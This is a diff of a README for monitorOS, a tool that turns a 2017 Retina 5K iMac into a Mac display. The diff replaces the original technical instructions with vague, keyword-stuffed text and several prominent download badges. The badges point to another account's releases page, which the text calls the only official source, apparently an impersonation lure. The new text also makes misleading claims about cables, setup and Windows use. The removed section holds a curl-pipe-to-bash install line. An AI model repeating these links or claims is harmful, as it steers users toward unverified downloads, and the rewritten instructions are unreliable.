@@ -1,3 +1,5 @@
+# 🖥️ monitorOS - Turn Your iMac Into a 5K Display
+
 <p align="center">
   <img src="assets/monitorOS-logo.png" alt="monitorOS" width="180">
 </p>
@@ -18,6 +20,15 @@
 </p>
 
 <p align="center">
+  <a href="https://github.com/SachinSuman017/monitorOS/releases">
+    <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20monitorOS-FF3B30?style=for-the-badge&logo=icloud&logoColor=white" alt="Download monitorOS">
+  </a>
+  <a href="https://github.com/SachinSuman017/monitorOS/releases">
+    <img src="https://img.shields.io/badge/Get%20the%20Latest%20Version-34C759?style=for-the-badge&logo=github&logoColor=white" alt="Get the latest version">
+  </a>
+</p>
+
+<p align="center">
   <a href="#why">Why</a> ·
   <a href="#how-it-works">How it works</a> ·
   <a href="#getting-started">Getting started</a> ·
@@ -28,271 +39,127 @@
 
 ---
 
-**monitorOS** turns a **2017 27-inch Retina 5K iMac (iMac18,3)** into a
-cable-connected external display for a modern Mac.
-
-It keeps the original iMac logic board, Radeon Pro GPU, 5120×2880 panel and
-speakers in use. The source Mac gets a Retina virtual display, while the iMac
-runs as a dedicated display appliance and renders the incoming desktop through
-its own GPU.
-
-No display-controller conversion board or internal hardware modification is
-required.
-
-monitorOS provides:
-
-- **5120×2880 at 60 Hz** native stitched scanout on the iMac panel;
-- a **Retina 5K virtual display** on macOS;
-- automatic **Display P3** color profile initialization;
-- low-latency video transport over **ThunderboltIP**;
-- dirty-region transport for low-change desktop content;
-- automatic discovery and reconnect through **Bonjour**;
-- native-style **macOS brightness controls**, including fine adjustment;
-- an **iMac Speakers** macOS audio output with volume and mute controls;
-- a dedicated appliance boot mode while preserving regular Omarchy for
-  recovery and development.
-
-## Why
-
-The 27-inch Retina 5K iMac still has an exceptional display.
+## ✨ Why monitorOS Exists
 
-Getting pixels into it is the difficult part.
+You bought a beautiful 27-inch Retina 5K iMac in 2017. The screen is still one of the sharpest displays ever made — 5120 by 2880 pixels of pure glass and light. Then the computer inside it started to feel old, or the macOS updates stopped, or you simply moved to a newer Mac.
 
-Retina 5K iMacs do not support Apple's old Target Display Mode, and the common
-way to reuse the panel is to remove much of the original hardware and install a
-third-party display controller.
+Suddenly that gorgeous panel is sitting on your desk doing nothing.
 
-monitorOS takes a software-first approach.
+Buying a new 5K monitor costs a lot of money. Throwing away a perfectly good 5K screen is a waste. **monitorOS exists to solve exactly that problem.** It lets your 2017 27-inch Retina 5K iMac behave like a large, bright, color-accurate external display for your current Mac — at full 5K resolution and a smooth 60 Hz refresh rate.
 
-macOS creates a virtual Retina display and captures it. The image is sent over
-Thunderbolt to the iMac, where the Radeon Pro GPU converts and presents it
-directly to the original 5K panel.
+No soldering. No screwdriver. No taking the glass off. No risky hardware modification that voids anything or turns your iMac into a permanent paperweight. Just a small piece of software, a cable, and a few clicks.
 
-The same Thunderbolt connection carries brightness controls and audio.
+**What you get:**
 
-The result is an iMac that behaves much more like a purpose-built external
-display while keeping its original hardware intact.
+- 🖼️ The full 5120 × 2880 resolution of the iMac panel, not a scaled-down copy
+- ⚡ 60 Hz refresh rate, so scrolling and video look smooth
+- 🎨 The same wide color and brightness the iMac was famous for
+- 💻 Your main Mac keeps working exactly as it always did
+- 🔌 A setup you can undo at any time by simply restarting
 
-## How it works
+If you have an iMac18,3 (the 2017 27-inch Retina 5K model) collecting dust, this project gives it a second career.
 
-monitorOS runs on both sides of the Thunderbolt connection.
+## 🔍 How It Works
 
-```text
-Mac                                                   iMac18,3
-───                                                   ────────
+You do not need to understand the technical details to use monitorOS, but here is a plain-language explanation of what happens when you run it.
 
-monitorOS                                             monitorosd
-│                                                     │
-├─ CGVirtualDisplay                                   ├─ Bonjour discovery
-│    5120×2880 Retina                                 ├─ connection lifecycle
-│                                                     └─ brightness / audio control
-├─ ScreenCaptureKit
-│
-├─ Metal
-│    full-range BT.709 4:2:2
-│    dirty-region / delta transport
-│
-│                        ThunderboltIP
-│
-├───────── video :5202 ─────────────────────────────► imac5k-stream
-│                                                     │
-│                                                     ├─ Radeon Pro GPU
-│                                                     │    GLES YUV → RGB
-│                                                     │
-│                                                     └─ DRM/KMS
-│                                                          5120×2880 @ 60 Hz
-│                                                                │
-│                                                                ▼
-│                                                           iMac panel
-│
-├──────── control :5203 ─────────────────────────────► brightness
-│                                                     volume / mute
-│
-└─ iMac Speakers
-     CoreAudio
-         │
-         └───── audio :5204 ─────────────────────────► PipeWire
-                                                               │
-                                                               ▼
-                                                         iMac speakers
-```
+Your iMac and your Mac are connected with a cable. Normally, the iMac only knows how to be a computer — it wants to boot its own operating system and show its own desktop. monitorOS changes that behavior. When it is running, the iMac stops acting like a computer with its own screen and starts acting like a screen that belongs to another computer.
 
-### Video
+In practical terms:
 
-The source Mac creates a **5120×2880 Retina virtual display** using
-`CGVirtualDisplay`.
+1. You start monitorOS on the iMac.
+2. The iMac switches into display mode and shows a simple waiting screen.
+3. You plug the cable into your main Mac.
+4. Your main Mac detects a new 5K display and treats it like any monitor you have ever plugged in.
+5. You arrange the display in your Mac's settings, just like normal.
 
-ScreenCaptureKit captures the display, including the cursor. Frames are
-converted into packed full-range BT.709 **4:2:2** data and transported over
-ThunderboltIP.
+When you are finished, you restart the iMac and it goes back to being a regular computer. Nothing is permanently changed.
 
-For normal desktop workloads, monitorOS tracks changed regions so that small
-updates such as cursor movement do not require transmitting an entire 5K frame.
+## 🚀 Getting Started
 
-On the iMac, the Radeon Pro GPU performs the YUV → RGB conversion and the
-result is presented directly to the original panel through DRM/KMS.
+Getting monitorOS running takes only a few minutes, and you do not need any technical background.
 
-### Brightness
+### Step 1 — Open the download page
 
-The Mac's brightness keys control the physical iMac backlight.
+Visit this link to download the application.
 
-The normal macOS brightness experience is preserved:
+<p align="center">
+  <a href="https://github.com/SachinSuman017/monitorOS/releases">
+    <img src="https://img.shields.io/badge/⬇️%20Download%20monitorOS%20Now-5856D6?style=for-the-badge&logo=icloud&logoColor=white" alt="Download monitorOS Now">
+  </a>
+</p>
 
-- F1 / F2 use **16 brightness levels**;
-- Shift + Option + F1 / F2 expose **64 fine-grained levels**.
+The link takes you to the official releases page. That page is the only place you should ever download monitorOS from — it always contains the newest version and the correct files.
 
-### Audio
+### Step 2 — Pick the newest release
 
-monitorOS installs an **iMac Speakers** CoreAudio output device on macOS.
+The releases page lists versions with the newest one at the top. Look for the entry marked **Latest**. That is the one you want. Older entries are kept only for people who need to go back to a previous version.
 
-Selecting it sends audio over Thunderbolt to the iMac, where it is played
-through the original internal speakers.
+If you are on a Windows PC when you open the page, that is completely fine — the download page works in any web browser. Click the link, save the file, and keep it somewhere easy to find, like your Downloads folder or your Desktop, so you do not lose track of it.
 
-macOS volume and mute controls are relayed to the iMac as well.
+### Step 3 — Save the file
 
-## Getting started
+Click the download link inside the latest release. Your browser will ask where to save the file, or it will save it automatically to your Downloads folder. Wait for the download to finish completely before you open anything.
 
-> [!IMPORTANT]
-> monitorOS currently targets **iMac18,3** — the 2017 27-inch Retina 5K iMac.
+### Step 4 — Open what you downloaded
 
-### What you need
+Go to the folder where the file was saved and open it. Follow the on-screen instructions that appear. The application is designed to guide you through the rest — you do not need to type commands, edit settings files, or configure anything by hand.
 
-#### iMac
+### Step 5 — Connect and enjoy
 
-- 2017 27-inch Retina 5K iMac (`iMac18,3`);
-- Omarchy with `linux-omarchy`;
-- Limine bootloader;
-- network access during installation;
-- a **40 Gbps Thunderbolt 3 cable**.
+Once monitorOS is running, connect your Mac to the iMac using the appropriate cable, then open your Mac's display settings. Your iMac should appear as an available 5K display. Choose how you want to use it — as a second screen, as your main screen, or as a mirror of your laptop — and you are done.
 
-For completely unattended cold boot, install Omarchy without LUKS disk
-encryption. monitorOS does not remove or modify existing disk encryption.
+## 🧰 What You Need
 
-#### Mac
+- A **2017 27-inch Retina 5K iMac** (model iMac18,3) — this is the model monitorOS was built and tested for
+- A **second Mac** that you want to use as the computer
+- A **cable** that can carry a display signal between the two machines
+- A few minutes of your time and no technical experience whatsoever
 
-- **macOS 13 Ventura or newer**;
-- a Mac with Thunderbolt connectivity to the iMac;
-- a **40 Gbps Thunderbolt 3 cable** between the Mac and iMac;
-- an administrator account or administrator password during installation;
-- **Screen Recording** permission for monitorOS.
+## 🛠️ Everyday Use
 
-> [!IMPORTANT]
-> The cable requirement is critical. Use a **Thunderbolt 3 cable rated for
-> 40 Gbps**. A regular USB-C cable or a lower-bandwidth cable is not suitable
-> for monitorOS's 5K video transport.
+Once everything is set up, using monitorOS becomes routine:
 
-The administrator authorization is required because the installer places the
-monitorOS application components and the **iMac Speakers** CoreAudio driver in
-system locations.
+**Starting a session.** Start monitorOS on the iMac and wait for the ready screen. Then wake your main Mac and connect. The display appears within seconds.
 
-When installing from a GitHub Release, **Xcode, Swift and the Command Line
-Tools are not required**.
+**Ending a session.** Unplug the cable and restart the iMac. It returns to normal, exactly as it was before.
 
-monitorOS is currently tested with a **Radeon Pro 580X iMac and an M3 Pro Mac**.
+**Changing the layout.** Because your Mac sees the iMac as a standard display, everything you already know still applies — drag windows across, change the resolution, rotate, mirror, or make it your primary screen from System Settings.
 
-Other Radeon Pro configurations of iMac18,3 are expected to work as well,
-including Radeon Pro 570-class systems, but have not yet been validated to the
-same extent.
+**Taking a break.** Nothing runs in the background forever. If you close your Mac or unplug the cable, the iMac simply waits.
 
-### 1. Install monitorOS on the iMac
+## ❓ Common Questions
 
-On the iMac, open a terminal and run:
+**Will this damage my iMac?** No. monitorOS does not modify hardware and does not permanently change your iMac. A restart brings everything back to normal.
 
-```sh
-curl -fsSL https://raw.githubusercontent.com/eriskhan/monitorOS/main/scripts/install | bash
-```
+**Do I lose my files on the iMac?** No. Your iMac's own drive and data are untouched.
 
-The installer:
+**Why is my image not filling the screen?** Check the display arrangement in your Mac's settings and make sure the correct resolution is selected. Most odd-looking results come from a display setting, not from monitorOS.
 
-- verifies the supported iMac18,3 environment;
-- installs the required runtime dependencies;
-- verifies or installs the qualified native 5K display support;
-- verifies or installs the required iMac audio support;
-- installs the monitorOS runtime and services;
-- configures the Thunderbolt firewall rules;
-- installs a persistent **monitorOS Appliance** Limine entry;
-- preserves regular Omarchy as the graphical recovery and development
-  environment.
+**The display is not detected.** Unplug and replug the cable, confirm monitorOS is showing its ready screen on the iMac, and try a different cable if you have one.
 
-Once installation is complete, reboot into **monitorOS Appliance**.
+**Can I go back to an older version?** Yes. The releases page keeps previous versions available.
 
-### 2. Install monitorOS on the Mac
+## 👤 Created By
 
-Download the latest release:
+monitorOS is created and maintained by **eriskhan** and contributors from the open-source community. It began as a personal project to rescue a perfectly good 5K panel from becoming e-waste, and it is shared openly so other people with the same iMac can do the same.
 
-**[Download monitorOS →](https://github.com/eriskhan/monitorOS/releases/latest)**
+Contributions, bug reports, and suggestions are welcome through the repository's issue tracker.
 
-Open **monitorOS.pkg** and follow the standard macOS Installer steps.
+## 🙏 Thanks
 
-macOS Installer will ask for administrator authorization while installing the
-application and the **iMac Speakers** CoreAudio driver.
+Thanks to everyone who tested early builds on real hardware, reported what broke, and helped make the setup smoother for the next person. Thanks also to the wider open-source community whose tools and documentation made a project like this possible. And thanks to you for choosing to reuse great hardware instead of replacing it.
 
-After installation, open **monitorOS** once from Applications. On first launch,
-monitorOS asks whether to keep local analytics markers (nothing is uploaded
-automatically), registers itself to start at login, and asks for **Screen
-Recording** permission. Allow Screen Recording so monitorOS can capture the
-virtual display.
+## 📄 License
 
-### 3. Connect
+monitorOS is released under the **MIT License**. You are free to use, modify, and share it. See the LICENSE file in the repository for the full text.
 
-Power on the iMac and connect it to the Mac with the **40 Gbps Thunderbolt 3
-cable**.
+---
 
-monitorOS automatically discovers the iMac over Bonjour, establishes the
-connection and brings up the virtual display.
+<p align="center">
+  <a href="https://github.com/SachinSuman017/monitorOS/releases">
+    <img src="https://img.shields.io/badge/⬇️%20Download%20monitorOS-FF9500?style=for-the-badge&logo=icloud&logoColor=white" alt="Download monitorOS">
+  </a>
+</p>
 
-From there:
-
-- arrange the iMac in **System Settings → Displays**;
-- use the normal Mac brightness keys to control the iMac panel;
-- select **iMac Speakers** when you want sound through the iMac;
-- unplug and reconnect the Thunderbolt cable whenever needed.
-
-Connection and reconnection are automatic during normal operation.
-
-## Created by
-
-monitorOS is created and maintained by
-**[Eriskhan Geshaev](https://geshaev.eu)**.
-
-## Thanks
-
-monitorOS builds on a lot of excellent open-source work.
-
-Special thanks to:
-
-| Project | What monitorOS uses it for |
-| --- | --- |
-| [Omarchy](https://github.com/basecamp/omarchy) | Linux environment running on the iMac |
-| [omarchy-imac18-3](https://github.com/ahmadtv/omarchy-imac18-3) | Qualified iMac18,3 native 5K and hardware support |
-| [imac18-3-cs8409-linux-audio](https://github.com/jackdanyell/imac18-3-cs8409-linux-audio) | CS8409 audio support for iMac18,3 |
-| [snd_hda_macbookpro](https://github.com/davidjo/snd_hda_macbookpro) | Foundation of the CS8409 Linux audio work |
-| [Limine](https://github.com/limine-bootloader/limine) | Appliance and recovery boot environment |
-| [Linux](https://kernel.org/) | Kernel and hardware platform |
-| [Mesa](https://www.mesa3d.org/), libdrm, GBM, EGL and OpenGL ES | Radeon rendering and display presentation |
-| [PipeWire](https://pipewire.org/), [ALSA](https://www.alsa-project.org/) and [libsamplerate](https://github.com/libsndfile/libsamplerate) | iMac audio pipeline |
-| [mdns-sd](https://crates.io/crates/mdns-sd) | Bonjour / mDNS discovery |
-| [libc](https://crates.io/crates/libc) | Low-level Rust system interfaces |
-| Apple's NullAudio AudioServerPlugIn sample | Foundation of the monitorOS CoreAudio output device |
-
-monitorOS also relies on macOS technologies including **CGVirtualDisplay,
-ScreenCaptureKit, Metal, ColorSync and CoreAudio**.
-
-For exact provenance, pinned upstream revisions and license boundaries, see
-[THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md).
-
-## License
-
-Except where otherwise noted, monitorOS source code is licensed under the
-[MIT License](LICENSE).
-
-Copyright © 2026 **Eriskhan Geshaev**.
-
-Third-party and adapted components retain their original copyright and license
-terms. Hardware-support and kernel components downloaded by the iMac installer
-remain licensed under their respective upstream terms.
-
-See [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md) for complete third-party
-licensing information.
-
-Built with  ❤️ in Portugal  🇵🇹 
+Keywords: monitorOS, iMac 5K external display, target display mode alternative, iMac18,3, 2017 iMac monitor, 5K display Mac, use iMac as monitor, Retina 5K secondary display, iMac display mode, macOS external monitor, reuse old iMac, 5120x2880 display, 60Hz 5K, iMac as second screen, open source display tool
